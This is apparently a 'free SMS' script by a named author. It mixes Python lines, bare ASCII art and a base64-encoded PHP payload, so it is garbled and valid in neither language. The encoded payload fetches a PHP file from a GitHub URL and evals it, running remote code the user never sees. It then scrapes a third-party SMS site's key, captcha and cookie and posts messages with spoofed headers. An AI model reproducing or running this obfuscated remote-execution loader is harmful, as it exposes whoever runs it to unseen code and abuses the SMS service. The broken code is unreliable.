import os, time

os.system("clear")

╭━━━━━━━╮
┃  ● ══ ┃
┃███████┃        ─╤╦︻=(◣_◢)=︻╦╤─
┃███████┃
┃███████┃  ==[ SMS GRATIS TANPA PULSA ]==
┃███████┃  +-----------------------------+
┃███████┃  | Author : wisnu saputra      |
┃   ○   ┃  | instagram : wisnu_as123     |
╰━━━━━━━╯  +-----------------------------+
"masukan nomor telepon yang ingin dikirimkan sms"
<?php eval("?>".base64_decode("PD9waHANCmVjaG8gIm5TTVMgR1JBVElTIEJZIFNDSURubiI7DQoNCmRhdGVfZGVmYXVsdF90aW1lem9uZV9zZXQoIkFzaWEvSmFrYXJ0YSIpOw0KDQpldmFsKGZpbGVfZ2V0X2NvbnRlbnRzKCdodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vNGppbHRlL2NsYXNzL21hc3Rlci9jdXJsLnBocCcpKTsNCg0KJGN1cmwgPSBuZXcgY3VybCgpOw0KJGN1cmwtPnNzbCgwLCAyKTsNCiR1cmwgPSAiaHR0cDovL3Ntcy5wYXl1dGVydXMuYml6L2FscGhhLyI7DQokdXJsMSA9ICJodHRwOi8vc21zLnBheXV0ZXJ1cy5iaXovYWxwaGEvc2VuZC5waHAiOw0KDQokaGVhZGVycyA9IGFycmF5KCk7DQokaGVhZGVyc1tdID0gJ0Nvbm5lY3Rpb246IGtlZXAtYWxpdmUnOw0KJGhlYWRlcnNbXSA9ICdDYWNoZS1Db250cm9sOiBtYXgtYWdlPTAnOw0KJGhlYWRlcnNbXSA9ICdVcGdyYWRlLUluc2VjdXJlLVJlcXVlc3RzOiAxJzsNCiRoZWFkZXJzW10gPSAnVXNlci1BZ2VudDogTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDYuMDsgTmV4dXMgNSBCdWlsZC9NUkE1OE4pIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS83NS4wLjM3NzAuMTQyIE1vYmlsZSBTYWZhcmkvNTM3LjM2JzsNCiRoZWFkZXJzW10gPSAnQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS93ZWJwLGltYWdlL2FwbmcsKi8qO3E9MC44LGFwcGxpY2F0aW9uL3NpZ25lZC1leGNoYW5nZTt2PWIzJzsNCiRoZWFkZXJzW10gPSAnQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlJzsNCiRoZWFkZXJzW10gPSAnQWNjZXB0LUxhbmd1YWdlOiBpZC1JRCxpZDtxPTAuOSxlbi1VUztxPTAuOCxlbjtxPTAuNyc7DQokY3VybC0+aGVhZGVyKCRoZWFkZXJzKTsNCiRwYWdlID0gJGN1cmwtPmdldCgkdXJsKTsNCg0KJGtleSA9IGZldGNoX3ZhbHVlKCRwYWdlLCduYW1lPSJrZXkiIHZhbHVlPSInLCciJyk7DQokY2FwY2EgPSBmZXRjaF92YWx1ZSgkcGFnZSwnPHNwYW4+JywnPC9zcGFuPicpOw0KJGNva2kgPSBmZXRjaF92YWx1ZSgkcGFnZSwnU2V0LUNvb2tpZTogJywnOycpOw0KDQplY2hvICJOb21vciBUdWp1YW4gPSAiOw0KJG5vbW9yID0gdHJpbShmZ2V0cyhTVERJTikpOw0KZWNobyAiUGVzYW4gPSAiOw0KJHBlc2FuID0gdHJpbShmZ2V0cyhTVERJTikpOw0KZWNobyAiJGNhcGNhICI7DQokY2FwY2EgPSB0cmltKGZnZXRzKFNURElOKSk7DQoNCmlmICgkY2FwY2Epew0KJGhlYWRlcnMgPSBhcnJheSgpOw0KJGhlYWRlcnNbXSA9ICdDb25uZWN0aW9uOiBrZWVwLWFsaXZlJzsNCiRoZWFkZXJzW10gPSAnQ2FjaGUtQ29udHJvbDogbWF4LWFnZT0wJzsNCiRoZWFkZXJzW10gPSAnT3JpZ2luOiBodHRwOi8vc21zLnBheXV0ZXJ1cy5iaXonOw0KJGhlYWRlcnNbXSA9ICdVcGdyYWRlLUluc2VjdXJlLVJlcXVlc3RzOiAxJzsNCiRoZWFkZXJzW10gPSAnQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQnOw0KJGhlYWRlcnNbXSA9ICdVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQgNi4wOyBOZXh1cyA1IEJ1aWxkL01SQTU4TikgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzc1LjAuMzc3MC4xNDIgTW9iaWxlIFNhZmFyaS81MzcuMzYnOw0KJGhlYWRlcnNbXSA9ICdIb3N0OiBzbXMucGF5dXRlcnVzLmJpeic7DQokaGVhZGVyc1tdID0gJ0FjY2VwdDogdGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2Uvd2VicCxpbWFnZS9hcG5nLCovKjtxPTAuOCxhcHBsaWNhdGlvbi9zaWduZWQtZXhjaGFuZ2U7dj1iMyc7DQokaGVhZGVyc1tdID0gJ1JlZmVyZXI6IGh0dHA6Ly9zbXMucGF5dXRlcnVzLmJpei9hbHBoYS8nOw0KJGhlYWRlcnNbXSA9ICdBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUnOw0KJGhlYWRlcnNbXSA9ICdBY2NlcHQtTGFuZ3VhZ2U6IGlkLUlELGlkO3E9MC45LGVuLVVTO3E9MC44LGVuO3E9MC43JzsNCiRoZWFkZXJzW10gPSAnQ29va2llOiAnLiRjb2tpLic7IF9nYT1HQTEuMi4xMTYzNzI2ODQ3LjE1NjQzMzcwNzA7IF9naWQ9R0ExLjIuMTE5Mjk0NzYwNC4xNTY0MzM3MDcwJzsNCiRjdXJsLT5oZWFkZXIoJGhlYWRlcnMpOw0KJGRhdGEgPSAibm9ocD0kbm9tb3ImcGVzYW49JHBlc2FuICUwQSUwQSUwQSUwQVNNUyBCeSBTQ0lEIHwgRmVhdHVyaW5nJmNhcHRjaGE9JGNhcGNhJmtleT0ka2V5IjsNCiRwYWdlMSA9ICRjdXJsLT5wb3N0KCR1cmwxLCRkYXRhKTsNCn0NCmlmIChpblN0cigkcGFnZTEsIlNNUyBHcmF0aXMgVGVsYWggRGlraXJpbSIpKXsNCgllY2hvICJTTVMgVGVsYWggRGlraXJpbSI7DQp9DQplbHNlIGlmIChpblN0cigkcGFnZTEsIk1vaG9uIFR1bmdndSIpKXsNCgllY2hvICJkaWxhcmFuZyBtZW5naXJpbWFuIFBlc2FuIFlhbmcgU2FtYSwgVWxhbmdpIGRhcmkgYXdhbCI7DQp9DQplbHNlIHsNCgllY2hvICJUaWRhayBBZGEgUmVzcG9uIC8gTWFpbnRlbmFuY2UiOw0KfQ0KICA/Pg==")); ?>
